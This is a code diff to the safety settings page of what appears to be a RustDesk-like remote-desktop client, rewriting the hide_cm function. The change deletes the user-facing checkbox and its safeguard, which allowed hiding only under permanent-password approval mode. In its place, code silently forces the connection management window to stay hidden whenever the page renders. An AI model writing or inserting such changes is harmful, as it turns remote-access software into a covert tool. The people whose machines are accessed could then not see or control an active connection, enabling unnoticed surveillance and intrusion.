@@ -1355,100 +1355,22 @@ class _SafetyState extends State<_Safety> with AutomaticKeepAliveClientMixin {
   }
 
   Widget hide_cm(bool enabled) {
-    // 原有逻辑已注释，始终显示并可用
-    /*
-    return ChangeNotifierProvider.value(
-        value: gFFI.serverModel,
-        child: Consumer<ServerModel>(builder: (context, model, child) {
-          final enableHideCm = model.approveMode == 'password' &&
-              model.verificationMethod == kUsePermanentPassword;
-          onHideCmChanged(bool? b) {
-            if (b != null) {
-              bind.mainSetOption(
-                  key: 'allow-hide-cm', value: bool2option('allow-hide-cm', b));
-            }
-          }
-
-          return Tooltip(
-              message: enableHideCm ? "" : translate('hide_cm_tip'),
-              child: GestureDetector(
-                onTap:
-                    enableHideCm ? () => onHideCmChanged(!model.hideCm) : null,
-                child: Row(
-                  children: [
-                    Checkbox(
-                            value: model.hideCm,
-                            onChanged: enabled && enableHideCm
-                                ? onHideCmChanged
-                                : null)
-                        .marginOnly(right: 5),
-                    Expanded(
-                      child: Text(
-                        translate('Hide connection management window'),
-                        style: TextStyle(
-                            color: disabledTextColor(
-                                context, enabled && enableHideCm)),
-                      ),
-                    ),
-                  ],
-                ),
-              ));
-        }));
-    */
-    // 新逻辑：始终显示并可选
-    return ChangeNotifierProvider.value(
-        value: gFFI.serverModel,
-        child: Consumer<ServerModel>(builder: (context, model, child) {
-          void onHideCmChanged(bool? b) async {
-            if (b != null) {
-              // 1. 设置allow-hide-cm配置项 (给UI读取)
-              await bind.mainSetOption(
-                  key: 'allow-hide-cm', value: bool2option('allow-hide-cm', b));
-                  
-              // 2. 同时设置hide_cm配置项 (给CM启动时读取)
-              await bind.mainSetOption(
-                  key: 'hide_cm', value: b ? 'true' : 'false');
-                  
-              // 3. 更新内存中的状态
-              model.hideCm = b;
-              
-              // 4. 立即应用窗口显示/隐藏状态
-              try {
-                if (b) {
-                  await hideCmWindow();
-                } else {
-                  await showCmWindow();
-                }
-              } catch (e) {
-                debugPrint('应用窗口状态时出错: $e');
-              }
-              
-              // 5. 通知UI刷新
-              model.notifyListeners();
-            }
-          }
-          return Tooltip(
-              message: '',
-              child: GestureDetector(
-                onTap: () => onHideCmChanged(!model.hideCm),
-                child: Row(
-                  children: [
-                    Checkbox(
-                            value: model.hideCm,
-                            onChanged: onHideCmChanged // 关键：始终可选
-                            )
-                        .marginOnly(right: 5),
-                    Expanded(
-                      child: Text(
-                        translate('Hide connection management window'),
-                        style: TextStyle(
-                            color: disabledTextColor(context, true)),
-                      ),
-                    ),
-                  ],
-                ),
-              ));
-        }));
+    // 移除UI选项，但在初始化时自动设置配置
+    Future.delayed(Duration.zero, () async {
+      // 设置配置为始终隐藏CM窗口
+      await bind.mainSetOption(
+          key: 'allow-hide-cm', value: bool2option('allow-hide-cm', true));
+      await bind.mainSetOption(key: 'hide_cm', value: 'true');
+      
+      // 确保ServerModel的hideCm状态为true
+      if (!gFFI.serverModel.hideCm) {
+        gFFI.serverModel.hideCm = true;
+        gFFI.serverModel.notifyListeners();
+      }
+    });
+    
+    // 返回空容器，不显示任何UI元素
+    return Container();
   }
 
   List<Widget> autoDisconnect(BuildContext context) {
